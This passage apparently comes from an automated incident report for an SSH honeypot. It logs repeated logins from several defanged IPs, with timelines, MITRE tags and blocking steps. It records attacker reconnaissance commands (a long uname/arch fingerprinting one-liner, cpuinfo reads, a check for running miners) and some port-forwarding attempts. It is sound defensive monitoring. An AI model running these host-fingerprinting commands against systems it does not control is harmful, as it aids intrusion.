| `2026-07-21 05:43:30` | `cowrie.command.input` |
| `2026-07-21 05:43:30` | `cowrie.command.input` |
| `2026-07-21 05:43:30` | `cowrie.command.input` |
| `2026-07-21 05:43:30` | `cowrie.command.input` |
| `2026-07-21 05:43:30` | `cowrie.log.closed` |
| `2026-07-21 05:43:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f180b2e69bb8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 05:45 |
| **Last Seen** | 2026-07-21 05:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:45:24` | `cowrie.session.connect` |
| `2026-07-21 05:45:24` | `cowrie.client.version` |
| `2026-07-21 05:45:24` | `cowrie.client.kex` |
| `2026-07-21 05:45:26` | `cowrie.login.success` |
| `2026-07-21 05:45:27` | `cowrie.session.params` |
| `2026-07-21 05:45:27` | `cowrie.command.input` |
| `2026-07-21 05:45:27` | `cowrie.command.input` |
| `2026-07-21 05:45:27` | `cowrie.command.input` |
| `2026-07-21 05:45:27` | `cowrie.command.input` |
| `2026-07-21 05:45:27` | `cowrie.command.input` |
| `2026-07-21 05:45:27` | `cowrie.command.success` |
| `2026-07-21 05:45:27` | `cowrie.command.input` |
| `2026-07-21 05:45:27` | `cowrie.command.input` |
| `2026-07-21 05:45:27` | `cowrie.command.input` |
| `2026-07-21 05:45:27` | `cowrie.command.input` |
| `2026-07-21 05:45:28` | `cowrie.log.closed` |
| `2026-07-21 05:45:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a8f6f1d74da

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 05:47 |
| **Last Seen** | 2026-07-21 05:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:47:23` | `cowrie.session.connect` |
| `2026-07-21 05:47:23` | `cowrie.client.version` |
| `2026-07-21 05:47:23` | `cowrie.client.kex` |
| `2026-07-21 05:47:25` | `cowrie.login.success` |
| `2026-07-21 05:47:26` | `cowrie.session.params` |
| `2026-07-21 05:47:26` | `cowrie.command.input` |
| `2026-07-21 05:47:26` | `cowrie.command.input` |
| `2026-07-21 05:47:26` | `cowrie.command.input` |
| `2026-07-21 05:47:26` | `cowrie.command.input` |
| `2026-07-21 05:47:26` | `cowrie.command.input` |
| `2026-07-21 05:47:26` | `cowrie.command.success` |
| `2026-07-21 05:47:26` | `cowrie.command.input` |
| `2026-07-21 05:47:26` | `cowrie.command.input` |
| `2026-07-21 05:47:26` | `cowrie.command.input` |
| `2026-07-21 05:47:26` | `cowrie.command.input` |
| `2026-07-21 05:47:27` | `cowrie.log.closed` |
| `2026-07-21 05:47:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f283eb79158

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 05:49 |
| **Last Seen** | 2026-07-21 05:49 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:49:17` | `cowrie.session.connect` |
| `2026-07-21 05:49:18` | `cowrie.client.version` |
| `2026-07-21 05:49:18` | `cowrie.client.kex` |
| `2026-07-21 05:49:20` | `cowrie.login.success` |
| `2026-07-21 05:49:21` | `cowrie.session.params` |
| `2026-07-21 05:49:21` | `cowrie.command.input` |
| `2026-07-21 05:49:21` | `cowrie.command.input` |
| `2026-07-21 05:49:21` | `cowrie.command.input` |
| `2026-07-21 05:49:21` | `cowrie.command.input` |
| `2026-07-21 05:49:21` | `cowrie.command.input` |
| `2026-07-21 05:49:21` | `cowrie.command.success` |
| `2026-07-21 05:49:21` | `cowrie.command.input` |
| `2026-07-21 05:49:21` | `cowrie.command.input` |
| `2026-07-21 05:49:21` | `cowrie.command.input` |
| `2026-07-21 05:49:21` | `cowrie.command.input` |
| `2026-07-21 05:49:22` | `cowrie.log.closed` |
| `2026-07-21 05:49:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1da5cf511bc

| Field | Detail |
|---|---|
| **Source IP** | `65.49.139[.]223` |
| **First Seen** | 2026-07-21 05:50 |
| **Last Seen** | 2026-07-21 05:51 |
| **Session Duration** | 43s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:50:17` | `cowrie.session.connect` |
| `2026-07-21 05:50:17` | `cowrie.client.version` |
| `2026-07-21 05:50:17` | `cowrie.client.kex` |
| `2026-07-21 05:50:17` | `cowrie.login.failed` |
| `2026-07-21 05:50:19` | `cowrie.login.success` |
| `2026-07-21 05:50:19` | `cowrie.session.params` |
| `2026-07-21 05:50:19` | `cowrie.command.input` |
| `2026-07-21 05:50:19` | `cowrie.command.failed` |
| `2026-07-21 05:50:19` | `cowrie.log.closed` |
| `2026-07-21 05:50:20` | `cowrie.session.params` |
| `2026-07-21 05:50:20` | `cowrie.command.input` |
| `2026-07-21 05:50:20` | `cowrie.log.closed` |
| `2026-07-21 05:50:21` | `cowrie.session.params` |
| `2026-07-21 05:50:21` | `cowrie.command.input` |
| `2026-07-21 05:50:21` | `cowrie.log.closed` |
| `2026-07-21 05:50:22` | `cowrie.session.params` |
| `2026-07-21 05:50:22` | `cowrie.command.input` |
| `2026-07-21 05:50:22` | `cowrie.log.closed` |
| `2026-07-21 05:50:23` | `cowrie.session.params` |
| `2026-07-21 05:50:23` | `cowrie.command.input` |
| `2026-07-21 05:50:23` | `cowrie.log.closed` |
| `2026-07-21 05:50:23` | `cowrie.session.params` |
| `2026-07-21 05:50:23` | `cowrie.command.input` |
| `2026-07-21 05:50:23` | `cowrie.log.closed` |
| `2026-07-21 05:50:24` | `cowrie.session.params` |
| `2026-07-21 05:50:24` | `cowrie.command.input` |
| `2026-07-21 05:50:24` | `cowrie.log.closed` |
| `2026-07-21 05:50:25` | `cowrie.session.params` |
| `2026-07-21 05:50:25` | `cowrie.command.input` |
| `2026-07-21 05:50:25` | `cowrie.log.closed` |
| `2026-07-21 05:50:26` | `cowrie.session.params` |
| `2026-07-21 05:50:26` | `cowrie.command.input` |
| `2026-07-21 05:50:26` | `cowrie.log.closed` |
| `2026-07-21 05:51:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.49.139[.]223` to AbuseIPDB if not already reported
- [ ] Block `65.49.139[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1086a2563994

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 05:51 |
| **Last Seen** | 2026-07-21 05:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:51:10` | `cowrie.session.connect` |
| `2026-07-21 05:51:10` | `cowrie.client.version` |
| `2026-07-21 05:51:10` | `cowrie.client.kex` |
| `2026-07-21 05:51:12` | `cowrie.login.success` |
| `2026-07-21 05:51:14` | `cowrie.session.params` |
| `2026-07-21 05:51:14` | `cowrie.command.input` |
| `2026-07-21 05:51:14` | `cowrie.command.input` |
| `2026-07-21 05:51:14` | `cowrie.command.input` |
| `2026-07-21 05:51:14` | `cowrie.command.input` |
| `2026-07-21 05:51:14` | `cowrie.command.input` |
| `2026-07-21 05:51:14` | `cowrie.command.success` |
| `2026-07-21 05:51:14` | `cowrie.command.input` |
| `2026-07-21 05:51:14` | `cowrie.command.input` |
| `2026-07-21 05:51:14` | `cowrie.command.input` |
| `2026-07-21 05:51:14` | `cowrie.command.input` |
| `2026-07-21 05:51:14` | `cowrie.log.closed` |
| `2026-07-21 05:51:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f78cfd2dd62

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 05:53 |
| **Last Seen** | 2026-07-21 05:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:53:03` | `cowrie.session.connect` |
| `2026-07-21 05:53:03` | `cowrie.client.version` |
| `2026-07-21 05:53:03` | `cowrie.client.kex` |
| `2026-07-21 05:53:05` | `cowrie.login.success` |
| `2026-07-21 05:53:07` | `cowrie.session.params` |
| `2026-07-21 05:53:07` | `cowrie.command.input` |
| `2026-07-21 05:53:07` | `cowrie.command.input` |
| `2026-07-21 05:53:07` | `cowrie.command.input` |
| `2026-07-21 05:53:07` | `cowrie.command.input` |
| `2026-07-21 05:53:07` | `cowrie.command.input` |
| `2026-07-21 05:53:07` | `cowrie.command.success` |
| `2026-07-21 05:53:07` | `cowrie.command.input` |
| `2026-07-21 05:53:07` | `cowrie.command.input` |
| `2026-07-21 05:53:07` | `cowrie.command.input` |
| `2026-07-21 05:53:07` | `cowrie.command.input` |
| `2026-07-21 05:53:07` | `cowrie.log.closed` |
| `2026-07-21 05:53:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7427d2b5d68a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 05:54 |
| **Last Seen** | 2026-07-21 05:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:54:59` | `cowrie.session.connect` |
| `2026-07-21 05:54:59` | `cowrie.client.version` |
| `2026-07-21 05:54:59` | `cowrie.client.kex` |
| `2026-07-21 05:55:01` | `cowrie.login.success` |
| `2026-07-21 05:55:02` | `cowrie.session.params` |
| `2026-07-21 05:55:02` | `cowrie.command.input` |
| `2026-07-21 05:55:02` | `cowrie.command.input` |
| `2026-07-21 05:55:02` | `cowrie.command.input` |
| `2026-07-21 05:55:02` | `cowrie.command.input` |
| `2026-07-21 05:55:02` | `cowrie.command.input` |
| `2026-07-21 05:55:02` | `cowrie.command.success` |
| `2026-07-21 05:55:02` | `cowrie.command.input` |
| `2026-07-21 05:55:02` | `cowrie.command.input` |
| `2026-07-21 05:55:02` | `cowrie.command.input` |
| `2026-07-21 05:55:02` | `cowrie.command.input` |
| `2026-07-21 05:55:03` | `cowrie.log.closed` |
| `2026-07-21 05:55:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27bbf0841689

| Field | Detail |
|---|---|
| **Source IP** | `93.177.157[.]179` |
| **First Seen** | 2026-07-21 05:56 |
| **Last Seen** | 2026-07-21 05:56 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:56:24` | `cowrie.session.connect` |
| `2026-07-21 05:56:24` | `cowrie.client.version` |
| `2026-07-21 05:56:24` | `cowrie.client.kex` |
| `2026-07-21 05:56:26` | `cowrie.login.success` |
| `2026-07-21 05:56:26` | `cowrie.direct-tcpip.request` |
| `2026-07-21 05:56:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.177.157[.]179` to AbuseIPDB if not already reported
- [ ] Block `93.177.157[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63badbefd569

| Field | Detail |
|---|---|
| **Source IP** | `185.2.228[.]48` |
| **First Seen** | 2026-07-21 05:56 |
| **Last Seen** | 2026-07-21 05:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:56:35` | `cowrie.session.connect` |
| `2026-07-21 05:56:36` | `cowrie.client.version` |
| `2026-07-21 05:56:36` | `cowrie.client.kex` |
| `2026-07-21 05:56:38` | `cowrie.login.success` |
| `2026-07-21 05:56:38` | `cowrie.direct-tcpip.request` |
| `2026-07-21 05:56:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.2.228[.]48` to AbuseIPDB if not already reported
- [ ] Block `185.2.228[.]48` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db2210e8e8a7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 05:56 |
| **Last Seen** | 2026-07-21 05:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:56:55` | `cowrie.session.connect` |
| `2026-07-21 05:56:56` | `cowrie.client.version` |
| `2026-07-21 05:56:56` | `cowrie.client.kex` |
| `2026-07-21 05:56:58` | `cowrie.login.success` |
| `2026-07-21 05:56:59` | `cowrie.session.params` |
| `2026-07-21 05:56:59` | `cowrie.command.input` |
| `2026-07-21 05:56:59` | `cowrie.command.input` |
| `2026-07-21 05:56:59` | `cowrie.command.input` |
| `2026-07-21 05:56:59` | `cowrie.command.input` |
| `2026-07-21 05:56:59` | `cowrie.command.input` |
| `2026-07-21 05:56:59` | `cowrie.command.success` |
| `2026-07-21 05:56:59` | `cowrie.command.input` |
| `2026-07-21 05:56:59` | `cowrie.command.input` |
| `2026-07-21 05:56:59` | `cowrie.command.input` |
| `2026-07-21 05:56:59` | `cowrie.command.input` |
| `2026-07-21 05:57:00` | `cowrie.log.closed` |
| `2026-07-21 05:57:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddc326f571c2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 05:58 |
| **Last Seen** | 2026-07-21 05:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:58:54` | `cowrie.session.connect` |
| `2026-07-21 05:58:54` | `cowrie.client.version` |
| `2026-07-21 05:58:54` | `cowrie.client.kex` |
| `2026-07-21 05:58:56` | `cowrie.login.success` |
| `2026-07-21 05:58:57` | `cowrie.session.params` |
| `2026-07-21 05:58:57` | `cowrie.command.input` |
| `2026-07-21 05:58:57` | `cowrie.command.input` |
| `2026-07-21 05:58:57` | `cowrie.command.input` |
| `2026-07-21 05:58:57` | `cowrie.command.input` |
| `2026-07-21 05:58:57` | `cowrie.command.input` |
| `2026-07-21 05:58:57` | `cowrie.command.success` |
| `2026-07-21 05:58:57` | `cowrie.command.input` |
| `2026-07-21 05:58:57` | `cowrie.command.input` |
| `2026-07-21 05:58:57` | `cowrie.command.input` |
| `2026-07-21 05:58:57` | `cowrie.command.input` |
| `2026-07-21 05:58:58` | `cowrie.log.closed` |
| `2026-07-21 05:58:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f358bc8e655

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 06:00 |
| **Last Seen** | 2026-07-21 06:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:00:55` | `cowrie.session.connect` |
| `2026-07-21 06:00:55` | `cowrie.client.version` |
| `2026-07-21 06:00:55` | `cowrie.client.kex` |
| `2026-07-21 06:00:57` | `cowrie.login.success` |
| `2026-07-21 06:00:58` | `cowrie.session.params` |
| `2026-07-21 06:00:58` | `cowrie.command.input` |
| `2026-07-21 06:00:58` | `cowrie.command.input` |
| `2026-07-21 06:00:58` | `cowrie.command.input` |
| `2026-07-21 06:00:58` | `cowrie.command.input` |
| `2026-07-21 06:00:58` | `cowrie.command.input` |
| `2026-07-21 06:00:58` | `cowrie.command.success` |
| `2026-07-21 06:00:58` | `cowrie.command.input` |
| `2026-07-21 06:00:58` | `cowrie.command.input` |
| `2026-07-21 06:00:58` | `cowrie.command.input` |
| `2026-07-21 06:00:58` | `cowrie.command.input` |
| `2026-07-21 06:00:59` | `cowrie.log.closed` |
| `2026-07-21 06:00:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9017104b8628

| Field | Detail |
|---|---|
| **Source IP** | `62.201.228[.]210` |
| **First Seen** | 2026-07-21 06:01 |
| **Last Seen** | 2026-07-21 06:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 06:01:02` | `cowrie.session.connect` |
| `2026-07-21 06:01:03` | `cowrie.client.version` |
| `2026-07-21 06:01:03` | `cowrie.client.kex` |
| `2026-07-21 06:01:04` | `cowrie.login.success` |
| `2026-07-21 06:01:05` | `cowrie.direct-tcpip.request` |
| `2026-07-21 06:01:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.201.228[.]210` to AbuseIPDB if not already reported
- [ ] Block `62.201.228[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67de25aaf7c7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 06:03 |
| **Last Seen** | 2026-07-21 06:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
